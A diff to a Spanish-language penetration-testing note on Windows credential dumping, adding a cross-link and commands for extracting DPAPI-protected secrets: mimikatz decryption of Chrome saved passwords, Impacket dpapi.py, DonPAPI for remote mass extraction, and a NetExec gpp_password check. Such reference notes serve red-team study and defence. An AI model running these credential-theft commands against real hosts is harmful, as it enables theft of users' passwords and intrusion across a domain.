@@ -27,7 +27,7 @@ Antes de elegir método conviene saber qué se está buscando: no todos los dep�
 | NTDS.dit en el DC | **Todo el dominio** | Admin de dominio o derechos de replicación |
 | DPAPI | Contraseñas de navegador, credenciales guardadas, RDP | Usuario o su clave maestra |
 
-LSASS es el de mejor relación valor/esfuerzo, y por eso es el más vigilado.
+LSASS es el de mejor relación valor/esfuerzo, y por eso es el más vigilado. Qué **son** estos depósitos (SAM, bootkey del SYSTEM, LSA, DPAPI) y por qué hace falta cada hive: [[Windows - almacenamiento de credenciales]].
 
 ## 1. LSASS — volcar el proceso
 
@@ -87,6 +87,10 @@ Copia de la base desde el propio DC, cuando ya hay ejecución ahí. No usa repli
 
 `mimikatz # dpapi::cred /in:C:\Users\u\AppData\Roaming\Microsoft\Credentials\<id>`
 `mimikatz # sekurlsa::dpapi`
+`mimikatz # dpapi::chrome /in:"...\Google\Chrome\User Data\Default\Login Data" /unprotect`
+Contraseñas guardadas del navegador. La masterkey DPAPI sale del volcado de LSASS/SECURITY.
+
+`dpapi.py` (Impacket) descifra blobs y credenciales con la masterkey, sin tocar Windows. `DonPAPI` lo hace **remoto y en masa** contra varios hosts.
 
 `nxc smb 10.0.0.20 -u admin -p 'pass' -M gpp_password`
 Contraseñas en preferencias de política de grupo. La clave de cifrado es pública desde 2014 y las políticas viejas siguen en SYSVOL.
